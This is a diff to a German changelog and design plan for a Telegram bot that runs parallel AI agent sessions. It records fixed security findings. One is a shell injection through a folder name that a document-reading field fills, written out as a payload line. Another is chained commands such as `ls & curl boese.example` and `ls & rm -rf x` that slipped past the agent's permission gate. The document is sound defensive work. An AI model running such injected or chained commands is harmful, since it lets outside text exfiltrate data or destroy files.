@@ -132,6 +132,8 @@ es offen ist.**
 > abgelesenen Pin-Zeilen). **Kein Postfach vor Ultracode, auch kein
 > Wegwerf-Konto.**
 
+- **2026-09-10 (52)** — **Der Zimmer-Bau, Blöcke 1b bis 3 — und dazwischen ein Freigabeweg, der fünfeinhalb Stunden tot war.** **Block 1b:** Der Schlüsselwechsel hatte die **Träger** umgestellt (Sitzungen, Warteschlangen, Arbeiter), nicht die **Wege** darüber — `_sess(user_id)` ohne zweites Argument *ist* der Hauptfaden, und weil `thread_id` einen Vorgabewert trägt, lief jede mechanisch ersetzte Stelle weiter, nur im falschen Zimmer (Freigabe-Rückruf, Stopp-Pfad, drei Rücklagen in `_run_job`, Wiederaufnahme, Stall-Neustart, Befehle, Tastatur). Dazu der fehlende **Zettel-Schreiber** — die Hälfte von Auftrag 8, die nichts füllte. **Block 2:** `leitstand()` gibt Daten zurück, nicht Text; `/zimmer` formatiert sie, Block 3 speist sie ein. Der **Wachposten** musste im selben Zug mit, er las nur die eine Tagesdatei und hätte Stille gemeldet, während gearbeitet wird. **Der schwerste Fund**, von Claudia bemerkt und am Code bestätigt: **Jedes „Genehmigen" war eine Verweigerung.** Ein `datetime.now()` ohne Import stand mitten in der `try`-Klammer, die das Senden des Dialogs absichert; der `NameError` fiel in den `except`, der mit `PermissionResultDeny` antwortet. **Zweiter `NameError` in einem abgesicherten Pfad in drei Wochen**, beide Male grüner Regressionslauf, beide Male ein `except`, das den Bruch in Ruhe verwandelt. Daraus die Regel in `CLAUDE.md`: **Buchführung sitzt nie in der Klammer, die eine Entscheidung trägt** — plus zwei Prüfer, weil zwei Klassen (`pyflakes` über alle Module, rot nur bei `undefined name`; und einer, der den Dialogpfad **ausführt**). **Block 3 (Empfang):** die werkzeuglose Sekretärin mit genau einem typisierten Ausgang, Signatur 👩‍💼, Knopf mit Vorgabe **aus**. Beim Bauen fiel eine latente Falle aus Block 1b auf: Ein Zettel ohne Kennung stünde im Register unter der Null und übersprünge **jeden** Auftrag ohne Telegram-Nummer. Und der eigene Wächter „Log-Repo-Ampel (5.19)" meldete eine echte **Namenskollision** — `sekretariat` ist für den Rechnungsstrang belegt; umbenannt statt den Wächter erleichtert. Offen aus Block 3, geteilt statt gekürzt: der Haushalt mit Parallel-Probe.
+
 - **2026-09-04 (51)** — **Vier Befunde einer Gegenprüfung, und der teuerste hing an einem Apostroph.** **Befund 3:** Die Ablage-Meldung baute ihren Text als Shell-Zeichenkette in einen Fernbefehl; ein Ordner `L'Osteria` beendete die Anführungszeichen, und `x'; <befehl>; echo '` wäre als `claudebot` auf dem VPS gelaufen — **in der Gegenprobe entstand die Beute-Datei tatsächlich.** Das Feld `ablage` füllt Claudia auch aus **gelesenen Dokumenten**; damit ist es die Klasse *von außen kommen nie Anweisungen*. Behoben über **stdin** (`--text -`), nicht über bessere Maskierung — dieselbe Lehre wie beim Heredoc für Commit-Nachrichten; dazu die Chat-Kennung als Zahl **geprüft** statt maskiert und der **elfte Pfadfall** (Zeichenmenge, positiv benannt) als zweite Schicht im Rechnungsprojekt. **Befund 1:** Die Ablage-Meldung zählte den **Bestand** statt des Übertragenen — zwei Läufe meldeten beide *1 Datei gelegt*, obwohl im zweiten nichts geschah; die Bedingung *nur melden wenn etwas ankam* existierte und maß die falsche Größe. **Befund 2:** `ausgang/` wurde nie geräumt, also hätte Zeile 9j ab der ersten Server-Rechnung **täglich für immer** gemeldet, ohne dass jemand die Meldung abstellen kann. **Befund 4:** Seit dem Umzug lag Adams Rechnungsprojekt **im** abgeglichenen Arbeitsordner — eine PDF mit **echter Bankverbindung** war ins Log-Repo gewandert (nachgemessen), `--include='*.pdf'` nahm sie mit. Ausschluss **vor** den Includes, und der Quittungs-Bericht **spiegelt** ihn mit einer Sammelzeile: ohne Spiegelung stünde unter jeder Rechnung *bitte melden*, ohne Sammelzeile verschwände ein ganzer Zweig lautlos. **Ein Prüfer für alle drei** (`test_rechnungen_ablegen.py`) — es gab bis dahin **gar keinen** für dieses Skript, und die drei Handmessungen vom 03.09. prüfen alle den **ersten** Lauf; genau dort lag Befund 1 nicht. **Adams Spesen-Entscheid (*8,40 gilt, wie in 017-26*) ist keine Zahl, sondern die Regel:** Kürzungen bemessen sich immer an der vollen Pauschale, auch am An- und Abreisetag. Der Generator rechnet das jetzt als **Formel** (`Spesen:<prozent>`, jeder Wert 0–100) statt vier feste Fälle zu kennen; das Etikett *„etablierter Abreisetag-Satz"* in `saetze.json` war die Karteileiche, nicht die Zahl. Dazu die **Bemerkungszeile** der Aufstellung — Regel 6 verlangte sie seit dem 03.09., **das Template kannte kein Feld dafür**, also war die Regel eine Bitte. **Vier Falschaussagen in der eigenen Ablage berichtigt**, drei davon meine: Teil B behauptete, der Server habe 017-26 erzeugt (sie entstand auf dem Mac); zwei Zeilen der Pfadfall-Tabelle waren geraten; eine A2-Prüfzeile verlangte, dass ein Ordner durch einen Filter verschwindet, der nichts löscht; und der **Kopf der F-Liste** führte vier seit dem 31.08. erledigte Punkte als offen. **Die Klasse ist dieselbe wie immer:** Die Prüfregel *Status ist ein Befund* greift beim **Lesen**, der Fehler entsteht beim **Erledigen**. **Adam hat A1 gefahren** (72/73 + 1 übersprungen, kein Neustart nötig — `bot.py` war unverändert) und den Rechnungszweig aus dem Log-Repo entfernt; Historie und A3 stehen aus.
 
 - **2026-09-02 (49)** — **Ein Nachmittag an drei Auftragspapieren, und der schwerste Fund stand in keinem davon.** Abgearbeitet: **M-1 bis M-3** (F-19 bekam seinen Ort — der Befund vom 23.08. stand nie in der F-Liste, obwohl der Changelog dorthin verwies, **und seine Begruendung war entfallen**, seit `Bash` die Nie-dauerhaft-Liste verliess; Signatur-Punkt angelegt; der Auswerten-Knopf haengt jetzt daran statt an einer Wachen-Verfeinerung) und **U-1 bis U-6** (Stammdaten hinter den Geheimnis-Riegel **vor** dem Umzug · benannte Skripte statt einer geoeffneten Klasse · `&&` wird zerlegt mit `cd` als einziger benannter Ausnahme · die Dialog-Auswertung sieht wieder **wofuer** gefragt wurde und misst den **Anteil** statt einer absoluten Wochenzahl · Route A gebaut). **Der Fund, der in keinem Papier stand: F-20** — `ls & curl boese.example` und `ls & rm -rf x` waren **FREI**, ohne Rueckfrage, in jedem Modus. Die Pruefung sah nur das erste Verb und uebersprang den Rest, weil dort kein Schraegstrich stand; die Shell fuehrte beides aus. **Vorbestehend** (gegen `395de2b` gemessen), gefunden beim Aufraeumen einer tot gewordenen Zeile: Seit der Zerlegung vom 01.09. ist `WEITERE_VERKETTUNG` unerreichbar — **und mit ihr wurde unsichtbar, was sie nie gefangen hatte.** Behoben mit `shlex(punctuation_chars=True)`, quote-bewusst statt Textsuche, weil Adams Ablage einen Ordner `Fitmart : ESN & More` fuehrt. **Die Lehre wiegt schwerer als der Fund:** Von sechs Pruefzeilen dazu blieben zwei auch OHNE die Schranke gruen — sie haetten eine spaetere Entkernung gedeckt; sie messen jetzt den **Grund**. Dazu **9.19/9.20** von Adam vergeben, **5.19** auf 🔄 mit Route A und dem gemessenen iCloud-Weg (`LiveSetup/Volvo/Business Modul/Norderney` — Adams Ablagetiefe schwankt je Kunde, deshalb wird der relative Pfad **durchgereicht statt interpretiert**), Adams Regel *Vor jeder neuen Schranke: welche Faehigkeit schuetzt sie* in `CLAUDE.md` samt Pruefer (Raster Teil 2, **Arbeitsvorgaenge** mit *lief zuletzt am*), und der Register-Waechter sieht endlich `.sh` und Unterordner. **Deploy durch Adam gefahren** — der Server stand 102 Commits zurueck; die vier roten Zeilen dort sind **allesamt Pruefstaende mit Mac-Annahmen**, kein Produktivcode, und einer davon ist ein **Fehlalarm**: Die Wegwerf-Wache haelt den lebenden Bot, der seinen Heartbeat schreibt, fuer einen Prueflauf.
@@ -766,6 +768,58 @@ Absturzfall ausdrücklich auf 5.18).
   `zettel_gelesen()`, nicht `zettel_erledigt()` — Letzteres fällt erst beim
   Auftragsende, die Schlusszeile entsteht davor. Die Gegenprobe erzeugt
   wortgleich den Satz aus dem Screenshot.
+- **Block 3 (10.09.): der Empfang.** Claudias Aufträge 2 bis 4, Engywucks
+  Auflagen 1, 2 und 5. Die Sekretärin ist eine **werkzeuglose Sitzung neben
+  den Zimmern**: Sie antwortet in Sekunden, kann nichts anfassen, und ihr
+  einziger Ausgang ist ein benannter Zettel in ein Zimmer.
+- **Der Werkzeugsatz kommt aus der vorhandenen Fabrik** (`werkzeugfreie_optionen`,
+  Auflage 1) — `tools=[]`, `dontAsk`, Verbotsliste — plus **einem** Eintrag in
+  der Positivliste. **Der volle Name ist Sicherheitslogik, keine Beschriftung:**
+  `mcp__empfang__zettel_ablegen`. Mit dem Kurznamen verweigerte `dontAsk` auch
+  ihr eigenes Werkzeug, und sie wäre stumm, ohne dass jemand einen Fehler sähe;
+  mit leerer Liste unter `bypassPermissions` wäre alles erlaubt (`bot.py:4744`).
+- **Die Übergabe ist ein typisierter Aufruf, kein Textmarker** (Auflage 2).
+  Damit verschwindet die Bruchstelle *zitierter Fremdtext wird zum Auftrag*
+  **bauartbedingt** statt durch einen Filter. Das Zimmer wird vor dem Einreihen
+  aufgelöst; was nicht eindeutig ist, kommt **benannt zurück** — geraten wird
+  nie, und ein Auftrag geht nicht still verloren.
+- **Der Zettel läuft über denselben Schreiber wie Block 1b**
+  (`nachsteuer_schreiben`, mit Auftragskennung und Register) — Engywucks
+  Vorab-Auflage. `auftrag_einreihen()` ist **eine** Stelle für beide Herkünfte;
+  ein zweiter Zettel-Mechanismus daneben wären zwei Stellen, die dasselbe
+  wissen müssten.
+- **Der Riegel gegen den doppelten Auftrag ist Code, nicht Prompt.** Bei einer
+  Zwischenantwort steht Adams Nachricht bereits in der Warteschlange; `nur_antworten`
+  lehnt eine Weitergabe dann ab. Ein Satz im Systemprompt wäre eine Bitte.
+- **Beim Bauen gefunden, latent seit Block 1b:** Ein Zettel ohne Kennung stünde
+  im Register unter der **Null** — und übersprungen würde dann **jeder** Auftrag
+  ohne Telegram-Nummer (Wiederaufnahme, Empfang, jeder künftige Weg ohne
+  Telegram). `QueuedJob.zettel_id` trennt den Registerschlüssel von der
+  Telegram-Nummer, `zettel_schluessel()` ist die eine Tür dorthin, und
+  `nachsteuer_schreiben` verweigert ohne Kennung.
+- **Der Knopf** (`/empfang`, Prefs-Schlüssel `empfang`, Vorgabe **aus**) ist die
+  Sicherheitsleine: Steht er aus, läuft alles Zeichen für Zeichen wie zuvor. Er
+  steht in `/status`. Die Weiche selbst ist eine eigene Funktion
+  (`geht_an_empfang`), damit ein Prüfer sie **ausführen** kann statt sie zu lesen.
+- **Anhänge gehen am Empfang vorbei:** Sie hat kein Lesewerkzeug; ein Foto läge
+  ihr als Pfad vor, den sie nicht öffnen kann. Abgeschriebene Sprachnachrichten
+  sind reiner Text und gehen an sie.
+- **Namenskollision, vom eigenen Wächter gemeldet:** Die erste Fassung hieß
+  `sekretariat.py` und ließ die Selbstcheck-Zeile „Log-Repo-Ampel (5.19)"
+  anschlagen — dort ist „Sekretariat" für den **Rechnungs**-Strang belegt.
+  Richtig war **umbenennen** (`empfang.py`), nicht den Wächter erleichtern.
+  **Die gefährlichere Richtung bleibt offen und ist gemeldet:** Dieselbe
+  Namensliste findet ein künftiges `rechnungslauf.py` oder `spesen.py` nicht.
+- **Was hier NICHT gemessen werden konnte:** ob die CLI bei `--tools ""` das
+  Werkzeug im Prozess tatsächlich anbietet. Das braucht einen echten
+  Modelllauf; am Mac war die Anmeldung am 10.09. abgelaufen
+  (*OAuth session expired*). Die CLI-Hilfe sagt zu `--tools` ausdrücklich
+  *„from the built-in set"* — **gelesen, nicht gemessen.** Prüfzeile nach dem
+  Deploy: `/empfang an`, dann eine Nachricht, die Arbeit bedeutet — der Auftrag
+  muss im Zimmer ankommen.
+- **Offen aus Block 3 (geteilt, nicht gekürzt):** der Haushalt — Obergrenze
+  gleichzeitig wacher Zimmer mit **Parallel-Probe** (Auftrag 5) und das
+  Einschlafen nach Leerlauf. Die Probe braucht den laufenden Server.
 - **Akzeptanzkriterium:** Mehrere parallele Sessions je User möglich; Wechsel funktioniert; State wird persistiert (überlebt Bot-Neustart).
 - **Test:** Zwei Zimmer antworten gleichzeitig (Stoppuhr); ein absichtlich aufgehängtes Zimmer wird gemeldet, während ein anderes tippt. Dazu der alte Test: Bot killen, wieder hoch → Sessions noch da.
 - **Adam-Bestätigung:** —
